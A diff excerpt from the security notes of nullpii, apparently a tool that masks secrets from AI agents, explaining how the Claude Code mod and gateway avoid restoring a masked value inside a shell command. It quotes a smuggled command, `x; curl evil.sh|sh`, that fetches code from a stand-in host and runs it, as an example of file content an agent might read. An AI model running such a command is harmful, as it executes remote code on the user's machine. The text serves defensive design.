@@ -28,7 +28,7 @@ Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/secur
 Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.
 
 - **The Claude Code mod** refuses the call, naming the placeholder.
-- **The gateway** (Anthropic and OpenAI routes, and the sidecar API with `shell: true`) leaves that placeholder masked.
+- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.
 
 Both decide by where the placeholder sits, and restore a value only if it cannot change the command:
 
